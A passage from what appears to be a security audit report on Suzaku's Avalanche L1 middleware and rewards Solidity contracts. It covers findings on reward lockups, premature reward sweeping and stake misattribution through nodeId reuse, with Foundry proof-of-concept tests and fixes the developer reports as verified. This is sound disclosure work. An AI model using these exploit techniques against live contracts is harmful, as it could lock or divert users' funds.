Consider eliminating the ability to arbitrarily update the `vaultManager` once the middleware is initialized. Flexibility to update this variable introduces unintended side-effects that likely expand the attack surface.

**Suzaku:**
Fixed in commit [35f6e56](https://github.com/suzaku-network/suzaku-core/pull/155/commits/35f6e5604c9d3ea77ad38424bb7587f4977f2146).

**Cyfrin:** Verified.



### Premature zeroing of epoch rewards in `claimUndistributedRewards` can block legitimate claims

**Description:** The `claimUndistributedRewards` function allows the `REWARDS_DISTRIBUTOR_ROLE` to collect any rewards for an `epoch` that were not claimed. It includes a check: `if (currentEpoch < epoch + 2) revert EpochStillClaimable(epoch)`. This means it can be called when `currentEpoch >= epoch + 2`.

```solidity
/// @inheritdoc IRewards
function claimUndistributedRewards(
    uint48 epoch,
    address rewardsToken,
    address recipient
) external onlyRole(REWARDS_DISTRIBUTOR_ROLE) {
    if (recipient == address(0)) revert InvalidRecipient(recipient);

    // Check if epoch distribution is complete
    DistributionBatch storage batch = distributionBatches[epoch];
    if (!batch.isComplete) revert DistributionNotComplete(epoch);

    // Check if current epoch is at least 2 epochs ahead (to ensure all claims are done)
    uint48 currentEpoch = l1Middleware.getCurrentEpoch();
    if (currentEpoch < epoch + 2) revert EpochStillClaimable(epoch);
```

Simultaneously, regular users (stakers, operators, curators) can claim their rewards for a given `epoch` as long as `epoch < currentEpoch - 1` (which is equivalent to `epoch <= currentEpoch - 2`).

```solidity
// Claiming functions
/// @inheritdoc IRewards
function claimRewards(address rewardsToken, address recipient) external {
    if (recipient == address(0)) revert InvalidRecipient(recipient);

    uint48 lastClaimedEpoch = lastEpochClaimedStaker[msg.sender];
    uint48 currentEpoch = l1Middleware.getCurrentEpoch();

    if (currentEpoch > 0 && lastClaimedEpoch >= currentEpoch - 1) {
        revert AlreadyClaimedForLatestEpoch(msg.sender, lastClaimedEpoch);
    }
```

```solidity
/// @inheritdoc IRewards
function claimOperatorFee(address rewardsToken, address recipient) external {
    if (recipient == address(0)) revert InvalidRecipient(recipient);

    uint48 currentEpoch = l1Middleware.getCurrentEpoch();
    uint48 lastClaimedEpoch = lastEpochClaimedOperator[msg.sender];

    if (currentEpoch > 0 && lastClaimedEpoch >= currentEpoch - 1) {
        revert AlreadyClaimedForLatestEpoch(msg.sender, lastClaimedEpoch);
    }
```

This creates a critical overlap: when `currentEpoch == epoch + 2`, both regular claims for `epoch` are still permitted, AND `claimUndistributedRewards` for the same `epoch` can be executed.

The `claimUndistributedRewards` function, after calculating the undistributed amount but *before* transferring it, executes `rewardsAmountPerTokenFromEpoch[epoch].set(rewardsToken, 0);`. This action immediately zeroes out the record of available rewards for that `epoch` and `rewardsToken`.

**Impact:** If the `REWARDS_DISTRIBUTOR_ROLE` calls `claimUndistributedRewards` at the earliest possible moment (i.e., when `currentEpoch == epoch + 2`):

1.  The `rewardsAmountPerTokenFromEpoch[epoch]` for the specified token is set to zero.
2.  Any staker, operator, or curator who has not yet claimed their rewards for that `epoch` (but is still within their valid claiming window) will subsequently find that their respective claim functions (`claimRewards`, `claimOperatorFee`, `claimCuratorFee`) read zero available rewards from `rewardsAmountPerTokenFromEpoch[epoch]`.
3.  This leads to these legitimate claimants receiving zero rewards or their claim transactions reverting, effectively denying them their earned rewards.
4.  Critically, the "undistributed" amount claimed by the `REWARDS_DISTRIBUTOR_ROLE` will now be inflated, as it will include the rewards that *should* have gone to those users but were blocked from being claimed. This constitutes a mechanism for a privileged role to grief users and divert funds.

**Recommended Mitigation:** Ensure there is a distinct period after the regular claiming window closes before undistributed rewards can be swept. This prevents the overlap where both actions are permissible.

Modify the timing check in `claimUndistributedRewards`:
Change the condition from:
```solidity
if (currentEpoch < epoch + 2) revert EpochStillClaimable(epoch);
```

**Suzaku:**
Fixed in commit [71e9093](https://github.com/suzaku-network/suzaku-core/pull/155/commits/71e9093a53160b0b641e170429a7dd56d36f272c).

**Cyfrin:** Verified.





### Unclaimable rewards for removed vaults in `Rewards::claimRewards`

**Description:** In the `Rewards::claimRewards` function, stakers claim their rewards across all vaults they were active in during previous epochs. These vaults are determined by the `_getStakerVaults` function, which retrieves vaults via `middlewareVaultManager.getVaults(epoch)`.

```solidity
function _getStakerVaults(address staker, uint48 epoch) internal view returns (address[] memory) {
        address[] memory vaults = middlewareVaultManager.getVaults(epoch);
        uint48 epochStart = l1Middleware.getEpochStartTs(epoch);

        uint256 count = 0;

        // First pass: Count non-zero balance vaults
        for (uint256 i = 0; i < vaults.length; i++) {
            uint256 balance = IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0));
            if (balance > 0) {
                count++;
            }
        }
```

The vulnerability arises when a vault is removed **after rewards have been distributed** but **before the user claims them**. Since `getVaults(epoch)` no longer includes removed vaults, `_getStakerVaults` omits them from the list, and the rewards for those vaults are **never claimed**resulting in **permanently locked rewards**.

1. **Epoch 5**: Rewards are distributed for Vault 1 and Vault 2.
2. Staker 1 has staked in Vault 1 and earned rewards.
3. **Before claiming**, Vault 1 is removed from the system.
4. In **Epoch 6**, Staker 1 calls `claimRewards`.
5. `_getStakerVaults` internally calls `getVaults(epoch)`, which no longer includes Vault 1.
6. Vault 1 is skipped, and rewards for Epoch 5 remain **unclaimed**.
7. These rewards are now **permanently stuck** in the contract.


```solidity

function claimRewards(address rewardsToken, address recipient) external {
        if (recipient == address(0)) revert InvalidRecipient(recipient);

        uint48 lastClaimedEpoch = lastEpochClaimedStaker[msg.sender];
        uint48 currentEpoch = l1Middleware.getCurrentEpoch();

        if (currentEpoch > 0 && lastClaimedEpoch >= currentEpoch - 1) {
            revert AlreadyClaimedForLatestEpoch(msg.sender, lastClaimedEpoch);
        }

        uint256 totalRewards = 0;

        for (uint48 epoch = lastClaimedEpoch + 1; epoch < currentEpoch; epoch++) {
            address[] memory vaults = _getStakerVaults(msg.sender, epoch);
            uint48 epochTs = l1Middleware.getEpochStartTs(epoch);
            uint256 epochRewards = rewardsAmountPerTokenFromEpoch[epoch].get(rewardsToken);
```
**Impact:** Rewards become permanently unclaimable and locked within the contract.

**Proof of Concept:**
```solidity
function test_distributeRewards_andRemoveVault(
        uint256 uptime
    ) public {
        uint48 epoch = 1;
        uptime = bound(uptime, 0, 4 hours);

        address staker = makeAddr("Staker");
        address staker1 = makeAddr("Staker1");

        // Set staker balance in vault
        address vault = vaultManager.vaults(0);
        MockVault(vault).setActiveBalance(staker, 300_000 * 1e18);
        MockVault(vault).setActiveBalance(staker1, 300_000 * 1e18);

        // Set up stakes for operators, nodes, delegators and l1 middleware
        _setupStakes(epoch, uptime);

        vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
        uint256 epochTs = middleware.getEpochStartTs(epoch);
        MockVault(vault).setTotalActiveShares(uint48(epochTs), 400_000 * 1e18);

        // Distribute rewards
        test_distributeRewards(4 hours);

        vm.warp((epoch + 4) * middleware.EPOCH_DURATION());

        uint256 stakerBalanceBefore = rewardsToken.balanceOf(staker);

        vm.prank(staker);
        rewards.claimRewards(address(rewardsToken), staker);

        uint256 stakerBalanceAfter = rewardsToken.balanceOf(staker);

        uint256 stakerRewards = stakerBalanceAfter - stakerBalanceBefore;

        assertGt(stakerRewards, 0, "Staker should receive rewards");

        vaultManager.removeVault(vaultManager.vaults(0));

        uint256 stakerBalanceBefore1 = rewardsToken.balanceOf(staker1);

        vm.prank(staker1);
        rewards.claimRewards(address(rewardsToken), staker1);

        uint256 stakerBalanceAfter1 = rewardsToken.balanceOf(staker1);

        uint256 stakerRewards1 = stakerBalanceAfter1 - stakerBalanceBefore1;

        assertGt(stakerRewards1, 0, "Staker should receive rewards");
    }
```

**Recommended Mitigation:** Consider removing the `MiddlewareVaultManager::removeVault` function to prevent issue or allow removal only after a big chunk of epochs elapse.

**Suzaku:**
Fixed in commit [b94d488](https://github.com/suzaku-network/suzaku-core/pull/155/commits/b94d4880af05185a972178aeceb2877ab260b59b).

**Cyfrin:** Verified.


### Insufficient validation in `AvalancheL1Middleware::removeOperator` can create permanent validator lockup

**Description:** Removal of operators with active nodes, whether intentional or by accident, can permanently lock operator nodes and disrupt the protocol node rebalancing process.

The `AvalancheL1Middleware::disableOperator` and `AvalancheL1Middleware::removeOperator()` lack validation to ensure operators have no active nodes before removal.

```solidity
// AvalancheL1Middleware.sol
  function disableOperator(
        address operator
    ) external onlyOwner updateGlobalNodeStakeOncePerEpoch {
        operators.disable(operator); //@note disable an operator - this only works if operator exists
    }
function removeOperator(
    address operator
) external onlyOwner updateGlobalNodeStakeOncePerEpoch {
    (, uint48 disabledTime) = operators.getTimes(operator);
    if (disabledTime == 0 || disabledTime + SLASHING_WINDOW > Time.timestamp()) {
        revert AvalancheL1Middleware__OperatorGracePeriodNotPassed(disabledTime, SLASHING_WINDOW);
    }
    operators.remove(operator); // @audit no check
}
```

Once an operator is removed, most node management functions become permanently inaccessible due to access control restrictions:

```solidity
modifier onlyRegisteredOperatorNode(address operator, bytes32 nodeId) {
    if (!operators.contains(operator)) {
        revert AvalancheL1Middleware__OperatorNotRegistered(operator); // @audit Always fails for removed operators
    }
    if (!operatorNodes[operator].contains(nodeId)) {
        revert AvalancheL1Middleware__NodeNotFound(nodeId);
    }
    _;
}

// Force updates also blocked
function forceUpdateNodes(address operator, uint256 limitStake) external {
    if (!operators.contains(operator)) {
        revert AvalancheL1Middleware__OperatorNotRegistered(operator); // @audit prevents any force updates
    }
    // ... rest of function never executes
}

// Individual node operations blocked
function removeNode(bytes32 nodeId) external
    onlyRegisteredOperatorNode(msg.sender, nodeId) // @audit modifier blocks removed operators
{
    _removeNode(msg.sender, nodeId);
}
```


**Impact:**
1. permanent validator lockup where operators cannot exit the P-Chain
2. disproportionate stake reduction for remaining operators during undelegations
3. removed operators cannot be rebalanced

**Proof of Concept:** Run the test in AvalancheL1MiddlewareTest.t.sol

```solidity
function test_POC_RemoveOperatorWithActiveNodes() public {
    uint48 epoch = _calcAndWarpOneEpoch();

    // Add nodes for alice
    (bytes32[] memory nodeIds, bytes32[] memory validationIDs,) = _createAndConfirmNodes(alice, 3, 0, true);

    // Move to next epoch to ensure nodes are active
    epoch = _calcAndWarpOneEpoch();

    // Verify alice has active nodes and stake
    uint256 nodeCount = middleware.getOperatorNodesLength(alice);
    uint256 aliceStake = middleware.getOperatorStake(alice, epoch, assetClassId);
    assertGt(nodeCount, 0, "Alice should have active nodes");
    assertGt(aliceStake, 0, "Alice should have stake");

    console2.log("Before removal:");
    console2.log("  Active nodes:", nodeCount);
    console2.log("  Operator stake:", aliceStake);

    // First disable the operator (required for removal)
    vm.prank(validatorManagerAddress);
    middleware.disableOperator(alice);

    // Warp past the slashing window to allow removal
    uint48 slashingWindow = middleware.SLASHING_WINDOW();
    vm.warp(block.timestamp + slashingWindow + 1);

    // @audit Admin can remove operator with active nodes (NO VALIDATION!)
    vm.prank(validatorManagerAddress);
    middleware.removeOperator(alice);

    // Verify alice is removed from operators mapping
      address[] memory currentOperators = middleware.getAllOperators();
        bool aliceFound = false;
        for (uint256 i = 0; i < currentOperators.length; i++) {
            if (currentOperators[i] == alice) {
                aliceFound = true;
                break;
            }
        }
        console2.log("Alice found:", aliceFound);
        assertFalse(aliceFound, "Alice should not be in current operators list");

    // Verify alice's nodes still exist in storage
    assertEq(middleware.getOperatorNodesLength(alice), nodeCount, "Alice's nodes should still exist in storage");

    // Verify alice's nodes still have stake cached
    for (uint256 i = 0; i < nodeIds.length; i++) {
        uint256 nodeStake = middleware.nodeStakeCache(epoch, validationIDs[i]);
        assertGt(nodeStake, 0, "Node should still have cached stake");
    }

    // Verify stake calculations still work
    uint256 stakeAfterRemoval = middleware.getOperatorStake(alice, epoch, assetClassId);
    assertEq(stakeAfterRemoval, aliceStake, "Stake calculation should still work");

}
```

**Recommended Mitigation:** Consider allowing operator removal only if all active nodes of that operator are removed.


**Suzaku:**
Fixed in commit [f0a6a49](https://github.com/suzaku-network/suzaku-core/pull/155/commits/f0a6a49313f9a9789a8fb1bcaadeabf4aa63a3f8).

**Cyfrin:** Verified.


### Historical reward loss due to `NodeId` reuse in `AvalancheL1Middleware`

**Description:** The `AvalancheL1Middleware` contract is vulnerable to misattributing stake to a former operator (Operator A) if a new, colluding or coordinated operator (Operator B) intentionally re-registers a node using the *exact same `bytes32 nodeId`* that Operator A previously used. This scenario assumes Operator B is aware of Operator A's historical `nodeId` and that the underlying P-Chain NodeID (`P_X`, derived from the shared `bytes32 nodeId`) has become available for re-registration on the L1 `BalancerValidatorManager` after Operator A's node was fully decommissioned.

The issue stems from the `getActiveNodesForEpoch` function, which is utilized by `getOperatorUsedStakeCachedPerEpoch` for stake calculations. This function iterates through Operator A's historical `nodeId`s (stored permanently in `operatorNodes[A]`). When it processes the reused `bytes32 nodeId_X`, it converts it to its P-Chain NodeID format (`P_X`). It then queries `balancerValidatorManager.registeredValidators(P_X)` to get the current L1 `validationID`. Because Operator B has now re-registered `P_X` on L1, this query returns Operator B's new `validationID_B2`.

Subsequently, `getActiveNodesForEpoch` checks if the L1 validator instance `validationID_B2` (Operator B's node) was active during the queried epoch. If true, the stake associated with `validationID_B2` (which is Operator B's stake, read from `nodeStakeCache`) is incorrectly included in Operator A's "used stake" calculation for that epoch.

**Impact:**
- Operator A's "used stake" is artificially increased by Operator B's stake due to the malicious or coordinated reuse of `nodeId_X`. This can make Operator A appear to have more active collateral than they genuinely do during the epoch in question.
- Operator A may unjustly receive rewards that should have been attributed based on Operator B's capital and operational efforts, leading to a direct misallocation in rewards.

**Proof of Concept:**
1.  **Epoch E0:** Operator A registers node `N1` using `bytes32 nodeId_X`. This registration is processed by `BalancerValidatorManager`, resulting in L1 `validationID_A1` associated with the P-Chain NodeID `P_X` (derived from `nodeId_X`). Operator A has `stake_A`. `nodeId_X` is permanently recorded in `operatorNodes[A]`.
2.  **Epoch E1:** Node `N1` (`validationID_A1`) is fully removed from `BalancerValidatorManager`. The P-Chain NodeID `P_X` becomes available for a new L1 registration. `nodeId_X` remains in Operator A's historical record (`operatorNodes[A]`).
3.  **Epoch E2:**
    *   Operator B, in coordination with or having knowledge of Operator A's prior use of `nodeId_X` and the availability of `P_X` on L1, calls `AvalancheL1Middleware.addNode()` providing the *exact same `bytes32 nodeId_X`*.
    *   Operator B provides their own valid BLS key. Their node software uses its own valid TLS key that allows it to be associated with the P-Chain NodeID `P_X` during L1 registration (assuming `BalancerValidatorManager` either uses the input `P_X` as the primary identifier or that Operator B's TLS key happens to also correspond to `P_X` if strict matching is done).
    *   `BalancerValidatorManager` successfully registers this new L1 instance for P-Chain NodeID `P_X`, assigning it a new L1 `validationID_B2`. Operator B stakes `stake_B`. `nodeId_X` is now also recorded in `operatorNodes[B]`.
4.  **Querying for Operator A's Stake in Epoch E2:**
    *   A call is made to `l1Middleware.getOperatorUsedStakeCachedPerEpoch(E2, A, PRIMARY_ASSET_CLASS)`.
    *   `getActiveNodesForEpoch(A, E2)` is invoked. It finds the historical `nodeId_X` in `operatorNodes[A]`.
    *   It converts `nodeId_X` to `P_X`.
    *   The call `balancerValidatorManager.registeredValidators(P_X)` now returns `validationID_B2` (Operator B's currently active L1 instance for `P_X`).
    *   The function proceeds to use `validationID_B2` to fetch L1 validator details and then `nodeStakeCache[E2][validationID_B2]` to get the stake.
    *   **Result:** `stake_B` (Operator B's stake) is erroneously added to Operator A's total "used stake" for Epoch E2.

The following coded PoC can be run with the `AvalancheL1MiddlewareTest`'s setup:
```solidity
    function test_POC_MisattributedStake_NodeIdReused() public {
        console2.log("--- POC: Misattributed Stake due to NodeID Reuse ---");

        address operatorA = alice;
        address operatorB = charlie; // Using charlie as Operator B

        // Use a specific, predictable nodeId for the test
        bytes32 sharedNodeId_X = keccak256(abi.encodePacked("REUSED_NODE_ID_XYZ"));
        bytes memory blsKey_A = hex"A1A1A1";
        bytes memory blsKey_B = hex"B2B2B2"; // Operator B uses a different BLS key
        uint64 registrationExpiry = uint64(block.timestamp + 2 days);
        address[] memory ownerArr = new address[](1);
        ownerArr[0] = operatorA; // For simplicity, operator owns the PChainOwner
        PChainOwner memory pchainOwner_A = PChainOwner({threshold: 1, addresses: ownerArr});
        ownerArr[0] = operatorB;
        PChainOwner memory pchainOwner_B = PChainOwner({threshold: 1, addresses: ownerArr});


        // Ensure operators have some stake in the vault
        uint256 stakeAmountOpA = 20_000_000_000_000; // e.g., 20k tokens
        uint256 stakeAmountOpB = 30_000_000_000_000; // e.g., 30k tokens

        // Operator A deposits and sets shares
        collateral.transfer(staker, stakeAmountOpA);
        vm.startPrank(staker);
        collateral.approve(address(vault), stakeAmountOpA);
        (,uint256 sharesA) = vault.deposit(operatorA, stakeAmountOpA);
        vm.stopPrank();
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, operatorA, sharesA, delegator);

        // Operator B deposits and sets shares (can use the same vault or a different one)
        collateral.transfer(staker, stakeAmountOpB);
        vm.startPrank(staker);
        collateral.approve(address(vault), stakeAmountOpB);
        (,uint256 sharesB) = vault.deposit(operatorB, stakeAmountOpB);
        vm.stopPrank();
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, operatorB, sharesB, delegator);

        _calcAndWarpOneEpoch(); // Ensure stakes are recognized

        // --- Epoch E0: Operator A registers node N1 using sharedNodeId_X ---
        console2.log("Epoch E0: Operator A registers node with sharedNodeId_X");
        uint48 epochE0 = middleware.getCurrentEpoch();
        vm.prank(operatorA);
        middleware.addNode(sharedNodeId_X, blsKey_A, registrationExpiry, pchainOwner_A, pchainOwner_A, 0);
        uint32 msgIdx_A1_add = mockValidatorManager.nextMessageIndex() - 1;

        // Get the L1 validationID for Operator A's node
        bytes memory pchainNodeId_P_X_bytes = abi.encodePacked(uint160(uint256(sharedNodeId_X)));
        bytes32 validationID_A1 = mockValidatorManager.registeredValidators(pchainNodeId_P_X_bytes);
        console2.log("Operator A's L1 validationID_A1:", vm.toString(validationID_A1));

        vm.prank(operatorA);
        middleware.completeValidatorRegistration(operatorA, sharedNodeId_X, msgIdx_A1_add);

        _calcAndWarpOneEpoch(); // Move to E0 + 1 for N1 to be active
        epochE0 = middleware.getCurrentEpoch(); // Update epochE0 to where node is active

        uint256 stake_A_on_N1 = middleware.getNodeStake(epochE0, validationID_A1);
        assertGt(stake_A_on_N1, 0, "Operator A's node N1 should have stake in Epoch E0");
        console2.log("Stake of Operator A on node N1 (validationID_A1) in Epoch E0:", vm.toString(stake_A_on_N1));

        bytes32[] memory activeNodes_A_E0 = middleware.getActiveNodesForEpoch(operatorA, epochE0);
        assertEq(activeNodes_A_E0.length, 1, "Operator A should have 1 active node in E0");
        assertEq(activeNodes_A_E0[0], sharedNodeId_X, "Active node for A in E0 should be sharedNodeId_X");

        // --- Epoch E1: Node N1 (validationID_A1) is fully removed ---
        console2.log("Epoch E1: Operator A removes node N1 (validationID_A1)");
        _calcAndWarpOneEpoch();
        uint48 epochE1 = middleware.getCurrentEpoch();

        vm.prank(operatorA);
        middleware.removeNode(sharedNodeId_X);
        uint32 msgIdx_A1_remove = mockValidatorManager.nextMessageIndex() - 1;

        _calcAndWarpOneEpoch(); // To process removal in cache
        epochE1 = middleware.getCurrentEpoch(); // Update E1 to where removal is cached

        assertEq(middleware.getNodeStake(epochE1, validationID_A1), 0, "Stake for validationID_A1 should be 0 after removal in cache");

        vm.prank(operatorA);
        middleware.completeValidatorRemoval(msgIdx_A1_remove); // L1 confirms removal

        console2.log("P-Chain NodeID P_X (derived from sharedNodeId_X) is now considered available on L1.");

        activeNodes_A_E0 = middleware.getActiveNodesForEpoch(operatorA, epochE1); // Check active nodes for A in E1
        assertEq(activeNodes_A_E0.length, 0, "Operator A should have 0 active nodes in E1 after removal");

        // --- Epoch E2: Operator B re-registers a node N2 using the *exact same sharedNodeId_X* ---
        console2.log("Epoch E2: Operator B registers a new node N2 using the same sharedNodeId_X");
        _calcAndWarpOneEpoch();
        uint48 epochE2 = middleware.getCurrentEpoch();

        vm.prank(operatorB);
        middleware.addNode(sharedNodeId_X, blsKey_B, registrationExpiry, pchainOwner_B, pchainOwner_B, 0);
        uint32 msgIdx_B2_add = mockValidatorManager.nextMessageIndex() - 1;

        // Get the L1 validationID for Operator B's new node (N2)
        bytes32 validationID_B2 = mockValidatorManager.registeredValidators(pchainNodeId_P_X_bytes);
        console2.log("Operator B's new L1 validationID_B2 for sharedNodeId_X:", vm.toString(validationID_B2));
        assertNotEq(validationID_A1, validationID_B2, "L1 validationID for B's node should be different from A's old one");

        vm.prank(operatorB);
        middleware.completeValidatorRegistration(operatorB, sharedNodeId_X, msgIdx_B2_add);

        _calcAndWarpOneEpoch(); // Move to E2 + 1 for N2 to be active
        epochE2 = middleware.getCurrentEpoch(); // Update epochE2 to where node is active

        uint256 stake_B_on_N2 = middleware.getNodeStake(epochE2, validationID_B2);
        assertGt(stake_B_on_N2, 0, "Operator B's node N2 should have stake in Epoch E2");
        console2.log("Stake of Operator B on node N2 (validationID_B2) in Epoch E2:", vm.toString(stake_B_on_N2));

        bytes32[] memory activeNodes_B_E2 = middleware.getActiveNodesForEpoch(operatorB, epochE2);
        assertEq(activeNodes_B_E2.length, 1, "Operator B should have 1 active node in E2");
        assertEq(activeNodes_B_E2[0], sharedNodeId_X);


        // --- Querying for Operator A's Stake in Epoch E2 (THE VULNERABILITY) ---
        console2.log("Querying Operator A's used stake in Epoch E2 (where B's node is active with sharedNodeId_X)");

        // Ensure caches are up-to-date for Operator A for epoch E2
        middleware.calcAndCacheStakes(epochE2, middleware.PRIMARY_ASSET_CLASS());

        uint256 usedStake_A_E2 = middleware.getOperatorUsedStakeCachedPerEpoch(epochE2, operatorA, middleware.PRIMARY_ASSET_CLASS());
        console2.log("Calculated 'used stake' for Operator A in Epoch E2: ", vm.toString(usedStake_A_E2));
        // ASSERTION: Operator A's used stake should be 0 in epoch E2, as their node was removed in E1.
        // However, due to the issue, it will pick up Operator B's stake.
        assertEq(usedStake_A_E2, stake_B_on_N2, "FAIL: Operator A's used stake in E2 is misattributed with Operator B's stake!");

        // Let's ensure B's node is indeed seen as active by the mock in E2
        Validator memory validator_B2_details = mockValidatorManager.getValidator(validationID_B2);
        uint48 epochE2_startTs = middleware.getEpochStartTs(epochE2);
        bool b_node_active_in_e2 = uint48(validator_B2_details.startedAt) <= epochE2_startTs &&
                                   (validator_B2_details.endedAt == 0 || uint48(validator_B2_details.endedAt) >= epochE2_startTs);
        assertTrue(b_node_active_in_e2, "Operator B's node (validationID_B2) should be active in Epoch E2");

        console2.log("--- PoC End ---");
    }
```
Output:
```bash
Ran 1 test for test/middleware/AvalancheL1MiddlewareTest.t.sol:AvalancheL1MiddlewareTest
[PASS] test_POC_MisattributedStake_NodeIdReused() (gas: 2012990)
Logs:
  --- POC: Misattributed Stake due to NodeID Reuse ---
  Epoch E0: Operator A registers node with sharedNodeId_X
  Operator A's L1 validationID_A1: 0x2f034f048644fc181bae4bb9cab7d7c67065f4763bd63c7a694231d82397709d
  Stake of Operator A on node N1 (validationID_A1) in Epoch E0: 160000000000800
  Epoch E1: Operator A removes node N1 (validationID_A1)
  P-Chain NodeID P_X (derived from sharedNodeId_X) is now considered available on L1.
  Epoch E2: Operator B registers a new node N2 using the same sharedNodeId_X
  Operator B's new L1 validationID_B2 for sharedNodeId_X: 0xe42be7d4d8b89ec6045a7938c29cb3ad84e0852269c9ce43f370002f92894cde
  Stake of Operator B on node N2 (validationID_B2) in Epoch E2: 240000000001200
  Querying Operator A's used stake in Epoch E2 (where B's node is active with sharedNodeId_X)
  Calculated 'used stake' for Operator A in Epoch E2:  240000000001200
  --- PoC End ---

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.58ms (1.30ms CPU time)

Ran 1 test suite in 142.55ms (4.58ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** The `AvalancheL1Middleware` must ensure that when calculating an operator's historical stake, it strictly associates the activity with the L1 validator instances *that operator originally registered*.

1.  **Store L1 `validationID` with Original Registration:** When an operator (e.g., Operator A) registers a `middlewareNodeId` (e.g., `nodeId_X`), the unique L1 `validationID` (e.g., `validationID_A1`) returned by `BalancerValidatorManager` must be durably linked to Operator A and `nodeId_X` for that specific registration lifecycle within the middleware.
2.  **Modify `getActiveNodesForEpoch` Logic:**
    *   When `getActiveNodesForEpoch(A, epoch)` is called, it should iterate through the `(middlewareNodeId, original_l1_validationID)` pairs that Operator A historically registered.
    *   For each `original_l1_validationID` (e.g., `validationID_A1`):
        *   Query `balancerValidatorManager.getValidator(validationID_A1)` to get its historical `startedAt` and `endedAt` times.
        *   If this specific instance `validationID_A1` was active during the queried `epoch`, then use `validationID_A1` to look up stake in `nodeStakeCache`.
    *   This prevents the lookup from "slipping" to a newer `validationID` (like `validationID_B2`) that might currently be associated with the reused P-Chain NodeID `P_X` on L1 but was not the instance Operator A managed.

**Suzaku:**
Fixed in commit [2a88616](https://github.com/suzaku-network/suzaku-core/pull/155/commits/2a886168f4d4e63a6344c4de45d57bd8d9d851b6).

**Cyfrin:** Verified.




### Incorrect inclusion of removed nodes in `_requireMinSecondaryAssetClasses` during `forceUpdateNodes`

**Description:** The function `_requireMinSecondaryAssetClasses` is utilized within the `forceUpdateNodes` process. During execution, if a node is removed in the first iteration, the subsequent iteration still includes the removed node in the `_requireMinSecondaryAssetClasses` computation because the node remains in the list until the full removal process completes.

```solidity
if ((newStake < assetClasses[PRIMARY_ASSET_CLASS].minValidatorStake)
                    || !_requireMinSecondaryAssetClasses(0, operator)) {
      newStake = 0;
      _initializeEndValidationAndFlag(operator, valID, nodeId);
}
```
**Example Scenario:**

1. `forceUpdateNodes` is invoked for an operator managing 5 nodes and the operator stake dropped from the last epoch.
2. On the first iteration, the first node is removed due to a drop in the value of `_requireMinSecondaryAssetClasses` is executed.
3. On the second iteration, while checking if the second node should be removed, `_requireMinSecondaryAssetClasses` incorrectly includes the previously removed first node in its calculations, even though it is slated for removal. This will ultimately remove all five nodes.

This problem will occur only if the last epoch's operator stake dropped and the `limitStake` is a small value.

**Impact:** This behaviour can lead to inaccurate evaluations during node removal decisions. The presence of nodes marked for removal after the `_requireMinSecondaryAssetClasses` calculations can cause the system to misjudge whether the minimum requirements for secondary asset classes are met. This may result in either:

* Preventing necessary node removals, thereby retaining nodes that should be removed, or
* Causing inconsistencies in node state management, potentially affecting operator performance and system integrity.

**Proof of concept:**

 ```solidity
function test_AddNodes_AndThenForceUpdate() public {
        // Move to the next epoch so we have a clean slate
        uint48 epoch = _calcAndWarpOneEpoch();

        // Prepare node data
        bytes32 nodeId = 0x00000000000000000000000039a662260f928d2d98ab5ad93aa7af8e0ee4d426;
        bytes memory blsKey = hex"1234";
        uint64 registrationExpiry = uint64(block.timestamp + 2 days);
        bytes32 nodeId1 = 0x00000000000000000000000039a662260f928d2d98ab5ad93aa7af8e0ee4d626;
        bytes memory blsKey1 = hex"1235";
        bytes32 nodeId2 = 0x00000000000000000000000039a662260f928d2d98ab5ad93aa7af8e0ee4d526;
        bytes memory blsKey2 = hex"1236";
        address[] memory ownerArr = new address[](1);
        ownerArr[0] = alice;
        PChainOwner memory ownerStruct = PChainOwner({threshold: 1, addresses: ownerArr});

        // Add node
        vm.prank(alice);
        middleware.addNode(nodeId, blsKey, registrationExpiry, ownerStruct, ownerStruct, 0);
        bytes32 validationID = mockValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));

        vm.prank(alice);

        middleware.addNode(nodeId1, blsKey1, registrationExpiry, ownerStruct, ownerStruct, 0);
        bytes32 validationID1 = mockValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId1))));

        vm.prank(alice);

        middleware.addNode(nodeId2, blsKey2, registrationExpiry, ownerStruct, ownerStruct, 0);
        bytes32 validationID2 = mockValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId2))));

        // Check node stake from the public getter
        uint256 nodeStake = middleware.getNodeStake(epoch, validationID);
        assertGt(nodeStake, 0, "Node stake should be >0 right after add");

        bytes32[] memory activeNodesBeforeConfirm = middleware.getActiveNodesForEpoch(alice, epoch);
        assertEq(activeNodesBeforeConfirm.length, 0, "Node shouldn't appear active before confirmation");

        vm.prank(alice);
        // messageIndex = 0 in this scenario
        middleware.completeValidatorRegistration(alice, nodeId, 0);
        middleware.completeValidatorRegistration(alice, nodeId1, 1);

        middleware.completeValidatorRegistration(alice, nodeId2, 2);

        vm.startPrank(staker);
        (uint256 burnedShares, uint256 mintedShares_) = vault.withdraw(staker, 10_000_000);
        vm.stopPrank();

        _calcAndWarpOneEpoch();

        _setupAssetClassAndRegisterVault(2, 5, collateral2, vault3, 3000 ether, 2500 ether, delegator3);
        collateral2.transfer(staker, 10);
        vm.startPrank(staker);
        collateral2.approve(address(vault3), 10);
        (uint256 depositUsedA, uint256 mintedSharesA) = vault3.deposit(staker, 10);
        vm.stopPrank();

        _warpToLastHourOfCurrentEpoch();

        middleware.forceUpdateNodes(alice, 0);
        assertEq(middleware.nodePendingRemoval(validationID), false);
    }
```

**Recommended Mitigation:** Consider changing the implementation of `_requireMinSecondaryAssetClasses` to accept an `int256` parameter instead of a `uint256`. In the `forceUpdateNodes method`, if a node is removed, increment a counter and pass a negative value equal to the number of removed nodes.
If node removal occurs across multiple epochs, consider making the solution more robust, for example creating a counter of nodes, which are in process of removing.

```diff
- function _requireMinSecondaryAssetClasses(uint256 extraNode, address operator) internal view returns (bool) {
+ function _requireMinSecondaryAssetClasses(int256 extraNode, address operator) internal view returns (bool) {
        uint48 epoch = getCurrentEpoch();
        uint256 nodeCount = operatorNodesArray[operator].length; // existing nodes

        uint256 secCount = secondaryAssetClasses.length();
        if (secCount == 0) {
            return true;
        }
        for (uint256 i = 0; i < secCount; i++) {
            uint256 classId = secondaryAssetClasses.at(i);
            uint256 stake = getOperatorStake(operator, epoch, uint96(classId));
